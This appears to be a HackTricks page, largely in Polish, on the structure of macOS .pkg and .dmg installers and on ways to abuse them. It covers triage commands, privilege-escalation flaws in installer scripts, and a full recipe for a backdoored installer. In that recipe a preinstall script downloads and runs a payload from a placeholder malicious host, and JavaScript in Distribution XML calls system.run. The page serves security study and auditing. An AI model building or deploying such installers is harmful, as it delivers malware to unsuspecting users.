# Abuse macOS Installers

{{#include ../../../banners/hacktricks-training.md}}

## Podstawowe informacje o Pkg

macOS **installer package** (znany również jako plik `.pkg`) to format pliku używany przez macOS do **dystrybucji software**. Pliki te przypominają **pudełko zawierające wszystko, czego potrzebuje dany software**, aby poprawnie się zainstalować i działać.

Sam plik pakietu jest archiwum zawierającym **hierarchię plików i katalogów, które zostaną zainstalowane na docelowym** komputerze. Może również zawierać **skrypty** wykonujące zadania przed instalacją i po niej, takie jak konfigurowanie plików konfiguracyjnych lub usuwanie starych wersji software.

### Hierarchia

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Dostosowania (tytuł, tekst powitalny…) oraz sprawdzanie skryptów/instalacji
- **PackageInfo (xml)**: Informacje, wymagania instalacji, lokalizacja instalacji, ścieżki do uruchamianych skryptów
- **Bill of materials (bom)**: Lista plików do zainstalowania, zaktualizowania lub usunięcia wraz z uprawnieniami do plików
- **Payload (CPIO archive gzip compressed)**: Pliki do zainstalowania w `install-location` z PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Skrypty uruchamiane przed instalacją i po niej oraz dodatkowe zasoby wypakowywane do tymczasowego katalogu w celu wykonania.

### Dekompresja
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Aby wyświetlić zawartość installera bez ręcznej dekompresji, możesz również użyć darmowego narzędzia [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

### Skróty statycznego triage'u

Jeśli celem jest analiza, spróbuj **najpierw unikać otwierania pakietu za pomocą `Installer.app`**. Niektóre pakiety mogą wykonywać kod natychmiast po ich otwarciu przez Installer (na przykład za pośrednictwem `system.run()` lub installer plug-ins), dlatego ekstrakcja offline jest zwykle bezpieczniejszym punktem wyjścia.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## Podstawowe informacje o DMG

Pliki DMG, czyli Apple Disk Images, to format plików używany przez macOS firmy Apple do tworzenia obrazów dysków. Plik DMG jest zasadniczo **montowalnym obrazem dysku** (zawiera własny system plików), który zawiera surowe dane blokowe, zazwyczaj skompresowane i czasami zaszyfrowane. Po otwarciu pliku DMG macOS **montuje go tak, jakby był fizycznym dyskiem**, umożliwiając dostęp do jego zawartości.

> [!CAUTION]
> Należy pamiętać, że instalatory **`.dmg`** obsługują **tak wiele formatów**, że w przeszłości niektóre z nich zawierające luki w zabezpieczeniach były wykorzystywane do uzyskania **wykonania kodu w kernelu**.

### Hierarchia

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Hierarchia pliku DMG może różnić się w zależności od jego zawartości. Jednak w przypadku DMG aplikacji zazwyczaj ma ona następującą strukturę:

- Poziom najwyższy: Jest to katalog główny obrazu dysku. Często zawiera aplikację oraz ewentualnie link do folderu Applications.
- Aplikacja (.app): Jest to właściwa aplikacja. W systemie macOS aplikacja jest zazwyczaj pakietem zawierającym wiele pojedynczych plików i folderów, które składają się na aplikację.
- Link do Applications: Jest to skrót do folderu Applications w systemie macOS. Jego celem jest ułatwienie instalacji aplikacji. Możesz przeciągnąć plik .app na ten skrót, aby zainstalować aplikację.

## Privesc przez abuse pkg

### Wykonywanie z publicznych katalogów

Jeśli skrypt pre- lub post-installation na przykład wykonuje się z **`/var/tmp/Installerutil`**, a attacker może kontrolować ten skrypt, może eskalować uprawnienia za każdym razem, gdy skrypt zostanie wykonany. Inny podobny przykład:<sup>[1][3]</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Jest to [publiczna funkcja](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg), którą wywołuje kilka installerów i updaterów, aby **wykonać coś jako root**. Funkcja ta przyjmuje jako parametr **ścieżkę** do **pliku**, który ma zostać **wykonany**. Jeśli jednak attacker mógłby **zmodyfikować** ten plik, byłby w stanie **abuse'ować** jego wykonanie z uprawnieniami root w celu **eskalacji uprawnień**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Więcej informacji znajdziesz w tym wystąpieniu: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[8]</sup>

### Nadużywanie środowiska i shebangów

Współczesne błędy w PackageKit pokazały, że skrypty instalatorów są często wykonywane jako **zaufany kod root**, a jednocześnie w pobliżu nadal znajduje się kontekst kontrolowany przez atakującego. Podczas audytowania pakietów dostawców zwróć szczególną uwagę na:

- Interpretery powłoki, takie jak `#!/bin/zsh` / `#!/bin/bash`
- Wywołania takie jak `sudo -u $USER`, `launchctl asuser` lub dowolną logikę ufającą wartościom `$USER`, `$HOME`, `PATH`, `TMPDIR` albo ścieżkom względnym
- Interpretery inne niż powłoki, które mogą ładować kontrolowane przez użytkownika pliki init lub biblioteki
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
W przypadku błędu root-environment w PackageKit z 2024 roku (dziedziczenie `~/.zshenv` / `~/.bash*` podczas instalacji inicjowanych przez użytkownika) sprawdź [generic macOS privesc page](../macos-privilege-escalation.md). Jeśli pakiet jest **podpisany przez Apple**, ten sam błąd skryptu może mieć znaczenie dla **SIP/TCC**, ponieważ `system_installd` może posiadać `com.apple.rootless.install.heritable`; zobacz [stronę SIP](../macos-security-protections/macos-sip.md).<sup>[5][6]</sup>

### Execution by mounting

Jeśli instalator zapisuje dane do `/tmp/fixedname/bla/bla`, możliwe jest **utworzenie mounta** na `/tmp/fixedname` z opcją noowners, dzięki czemu można **modyfikować dowolny plik podczas instalacji**, aby nadużyć procesu instalacji.

Przykładem jest **CVE-2021-26089**, które umożliwiło **nadpisanie skryptu periodic** w celu uzyskania execution jako root. Więcej informacji znajdziesz w prezentacji: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[7]</sup>

## pkg as malware

### Empty Payload

Możliwe jest wygenerowanie pliku **`.pkg`** zawierającego **skrypty pre i post-install**, bez żadnego rzeczywistego payloadu poza malware znajdującym się w skryptach.

### JS in Distribution xml

Możliwe jest dodanie tagów **`<script>`** do pliku **distribution xml** pakietu. Kod zostanie wykonany i może **wykonywać polecenia** za pomocą **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

W przypadku distribution packages zwykle zależy to od tego, czy plik najwyższego poziomu `Distribution` zezwala na external scripts, na przykład za pomocą `allow-external-scripts="true"`. Dlatego sprawdzenie wyłącznie `preinstall` / `postinstall` nie wystarcza: sam **Distribution XML** może zawierać hooki `installation-check` / `volume-check` oraz bezpośrednie ścieżki wykonania `system.run()` / `system.runOnce()`.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Backdoored Installer

Malicious installer using a script and JS code inside dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## Źródła

- [1] [DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – macOS Red Teaming: Exploiting Installer Packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Breaking SIP with Apple-signed Packages](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - Death By 1000 Installers on macOS and it's all broken!](https://www.youtube.com/watch?v=lTOItyjTTkw)

{{#include ../../../banners/hacktricks-training.md}}
